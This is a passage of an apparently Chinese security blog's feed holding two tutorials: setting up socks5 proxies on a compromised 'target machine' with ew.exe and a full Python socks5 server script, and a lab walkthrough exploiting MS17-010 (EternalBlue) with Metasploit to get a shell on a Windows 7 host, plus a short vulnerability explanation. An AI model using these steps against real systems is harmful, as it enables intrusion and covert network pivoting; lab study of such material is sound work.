      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h3 id=&quot;1-、超简单&quot;&gt;&lt;a href=&quot;#1-、超简单&quot; class=&quot;headerlink&quot; title=&quot;1)、超简单&quot;&gt;&lt;/a&gt;1)、超简单&lt;/h3&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>公网服务器搭建socks5代理</title>
    <link href="http://yoursite.com/2018/05/01/%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BAsocks5%E4%BB%A3%E7%90%86/"/>
    <id>http://yoursite.com/2018/05/01/公网服务器搭建socks5代理/</id>
    <published>2018-05-01T05:52:25.000Z</published>
    <updated>2018-05-01T07:27:53.464Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天玩了一下内网，这里说一下windows和linux怎么搭建socks5代理。<a id="more"></a>文章中所用到的工具和脚本打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h2 id="windows环境下搭建socks5代理"><a href="#windows环境下搭建socks5代理" class="headerlink" title="windows环境下搭建socks5代理"></a>windows环境下搭建socks5代理</h2><h3 id="1、ew的使用"><a href="#1、ew的使用" class="headerlink" title="1、ew的使用"></a>1、ew的使用</h3><p>我这里是用ew和proxifier配合使用的，只需要把ew放到目标机上，然后执行一条命令就得了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew.exe -s ssocksd -l 8006</span><br></pre></td></tr></table></figure><p><img src="/2018/05/01/公网服务器搭建socks5代理/1.png" alt="image"></p><p>8006是要使用的端口，如果被占用了可以改用别的端口</p><h3 id="2、proxifier的配置"><a href="#2、proxifier的配置" class="headerlink" title="2、proxifier的配置"></a>2、proxifier的配置</h3><p>在目标机执行完那条命令之后就回到自己的机子，打开proxifier-&gt;配置文件-&gt;代理服务器-&gt;添加一个服务器，地址填刚才那台机子的ip地址，端口就是执行那条命令输入的端口，协议选socks版本5，确定。</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/2.png" alt="image"></p><p>这样就已经配置完成了，百度一下我们的ip地址</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/6.png" alt="image"></p><h2 id="linux环境搭建socks5代理"><a href="#linux环境搭建socks5代理" class="headerlink" title="linux环境搭建socks5代理"></a>linux环境搭建socks5代理</h2><p>linux搭建的话就要用到一个py脚本了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># Filename s5.py</span><br><span class="line"># Python Dynamic Socks5 Proxy</span><br><span class="line"># Usage: python s5.py 1080</span><br><span class="line"># Background Run: nohup python s5.py 1080 &amp;</span><br><span class="line"> </span><br><span class="line">import socket, sys, select, SocketServer, struct, time</span><br><span class="line"> </span><br><span class="line">class ThreadingTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer): pass</span><br><span class="line">class Socks5Server(SocketServer.StreamRequestHandler):</span><br><span class="line">    def handle_tcp(self, sock, remote):</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                if remote.send(sock.recv(4096)) &lt;= 0: break</span><br><span class="line">            if remote in r:</span><br><span class="line">                if sock.send(remote.recv(4096)) &lt;= 0: break</span><br><span class="line">    def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            pass # print &apos;from &apos;, self.client_address nothing to do.</span><br><span class="line">            sock = self.connection</span><br><span class="line">            # 1. Version</span><br><span class="line">            sock.recv(262)</span><br><span class="line">            sock.send(&quot;\x05\x00&quot;);</span><br><span class="line">            # 2. Request</span><br><span class="line">            data = self.rfile.read(4)</span><br><span class="line">            mode = ord(data[1])</span><br><span class="line">            addrtype = ord(data[3])</span><br><span class="line">            if addrtype == 1:       # IPv4</span><br><span class="line">                addr = socket.inet_ntoa(self.rfile.read(4))</span><br><span class="line">            elif addrtype == 3:     # Domain name</span><br><span class="line">                addr = self.rfile.read(ord(sock.recv(1)[0]))</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.rfile.read(2))</span><br><span class="line">            reply = &quot;\x05\x00\x00\x01&quot;</span><br><span class="line">            try:</span><br><span class="line">                if mode == 1:  # 1. Tcp connect</span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                    remote.connect((addr, port[0]))</span><br><span class="line">                    pass # print &apos;To&apos;, addr, port[0]  nothing do to.</span><br><span class="line">                else:</span><br><span class="line">                    reply = &quot;\x05\x07\x00\x01&quot; # Command not supported</span><br><span class="line">                local = remote.getsockname()</span><br><span class="line">                reply += socket.inet_aton(local[0]) + struct.pack(&quot;&gt;H&quot;, local[1])</span><br><span class="line">            except socket.error:</span><br><span class="line">                # Connection refused</span><br><span class="line">                reply = &apos;\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00&apos;</span><br><span class="line">            sock.send(reply)</span><br><span class="line">            # 3. Transfering</span><br><span class="line">            if reply[1] == &apos;\x00&apos;:  # Success</span><br><span class="line">                if mode == 1:    # 1. Tcp connect</span><br><span class="line">                    self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error:</span><br><span class="line">            pass #print &apos;error&apos; nothing to do .</span><br><span class="line">        except IndexError:</span><br><span class="line">            pass</span><br><span class="line">def main():</span><br><span class="line">    filename = sys.argv[0];</span><br><span class="line">    if len(sys.argv)&lt;2:</span><br><span class="line">        print &apos;usage: &apos; + filename + &apos; port&apos;</span><br><span class="line">        sys.exit()</span><br><span class="line">    socks_port = int(sys.argv[1]);    </span><br><span class="line">    server = ThreadingTCPServer((&apos;&apos;, socks_port), Socks5Server)</span><br><span class="line">    print &apos;bind port: %d&apos; % socks_port + &apos; ok!&apos;</span><br><span class="line">    server.serve_forever()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>脚本在打包链接里面都有，这个也是一条命令就搞定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python s5.py 8088</span><br></pre></td></tr></table></figure><p><img src="/2018/05/01/公网服务器搭建socks5代理/3.png" alt="image"></p><p>同样的后面8088是端口，可以修改的，执行完了之后再回到我们的proxifier里面添加服务器，配置跟前面的一样</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/4.png" alt="image"></p><p>因为我这里的windows和linux是不同的机子，所以ip设置的跟前面的不一样</p><p>再来百度看一下ip地址</p><p><img src="/2018/05/01/公网服务器搭建socks5代理/5.png" alt="image"></p><p>OK，已经成功了！</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>emm，这篇文章主要是外网搭建socks5代理的，下一篇会讲到如果对方是内网的如何搭建socks5代理。</p><p>所有工具打包链接：<a href="https://github.com/R0both/R1bot.github.io/blob/master/proxifier.rar" target="_blank" rel="noopener">socks5工具</a></p><h5 id="—-未完待续—–"><a href="#—-未完待续—–" class="headerlink" title="—-未完待续—–"></a>—-未完待续—–</h5><h6 id="（注：本教程仅供学习，切勿用于非法用途！）"><a href="#（注：本教程仅供学习，切勿用于非法用途！）" class="headerlink" title="（注：本教程仅供学习，切勿用于非法用途！）"></a>（注：本教程仅供学习，切勿用于非法用途！）</h6>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这几天玩了一下内网，这里说一下windows和linux怎么搭建socks5代理。&lt;/p&gt;
    
    </summary>
    
      <category term="外网代理" scheme="http://yoursite.com/categories/%E5%A4%96%E7%BD%91%E4%BB%A3%E7%90%86/"/>
    
    
      <category term="代理" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Ms17_010漏洞的利用</title>
    <link href="http://yoursite.com/2018/04/09/Ms17-010%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2018/04/09/Ms17-010漏洞的利用/</id>
    <published>2018-04-09T11:39:36.000Z</published>
    <updated>2018-05-03T12:08:44.786Z</updated>
    
    <content type="html"><![CDATA[<p>ms_17_010是2017年的一个Windows的smb远程代码执行漏洞，这也算是一个被玩烂了的洞了，这篇文章就是关于如何利用和防护这个漏洞。</p><p> 攻击机：<br> kali<br> ip:192.168.245.132</p><p> 受害机：<br> win7<br> ip:192.168.61.160<br> <a id="more"></a><br>这里我是用我内网的两台机子测试的，如果是外网的那就要设置路由器的端口转发之类的。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞出现在Windows SMB v1中的内核态函数srv!SrvOs2FeaListToNt在处理FEA(File Extended Attributes)转换时，在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)上存在缓冲区溢出。函数srv!SrvOs2FeaListToNt在将FEA list转换成NTFEA(Windows NT FEA) list前会调用srv!SrvOs2FeaListSizeToNt去计算转换后的FEA lsit的大小。然后会进行如下操作：</p><p>1.srv!SrvOs2FeaListSizeToNt会计算FEA list的大小并更新待转换的FEA list的大小</p><p>2.因为错误的使用WORD强制类型转换，导致计算出来的待转换的FEA list的大小比真正的FEA list大</p><p>3.因为原先的总大小计算错误，导致当FEA list被转化为NTFEA list时，会在非分页池导致缓冲区溢出</p><h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>博主这里是直接用kali的msf里面自带的ms17_010模块<br>启动msf控制台<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure></p><p>然后使用ms17_010_eternalblue这个模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/09/Ms17-010漏洞的利用/1.jpg" alt="image"></p><p>用show options 命令查看设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/09/Ms17-010漏洞的利用/2.jpg" alt="image"></p><p>Exploit target表示可以攻击的目标，这个模块只能攻击win7和win server2008的，yes是表示需要设置的，由图可以看出其他都已经设置好了，我们只需要设置RHOST，也就是ip地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOST 192.168.61.160</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p>开始监听会话</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/3.jpg" alt="image"></p><p>看到这样子那就表示已经成功getshell了</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/4.jpg" alt="image"></p><p>尝试这输入一些命令</p><p><img src="/2018/04/09/Ms17-010漏洞的利用/5.jpg" alt="image"></p><p>好的已经成功入侵了这台电脑，现在他的电脑就是你的电脑，你的电脑还是你的电脑，接下来干嘛自己发挥想象力了！炒鸡简单的一个漏洞利用。</p><h2 id="如何防护"><a href="#如何防护" class="headerlink" title="如何防护"></a>如何防护</h2><p>电脑管家或者360之类的都已经有了对应的补丁，下载补丁就行了。</p><h6 id="注：本教程仅供学习，切勿用于非法用途！"><a href="#注：本教程仅供学习，切勿用于非法用途！" class="headerlink" title="(注：本教程仅供学习，切勿用于非法用途！)"></a>(注：本教程仅供学习，切勿用于非法用途！)</h6>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ms_17_010是2017年的一个Windows的smb远程代码执行漏洞，这也算是一个被玩烂了的洞了，这篇文章就是关于如何利用和防护这个漏洞。&lt;/p&gt;
&lt;p&gt; 攻击机：&lt;br&gt; kali&lt;br&gt; ip:192.168.245.132&lt;/p&gt;
&lt;p&gt; 受害机：&lt;br&gt; win7&lt;br&gt; ip:192.168.61.160&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="系统漏洞" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
    
    
  </entry>
  
</feed>
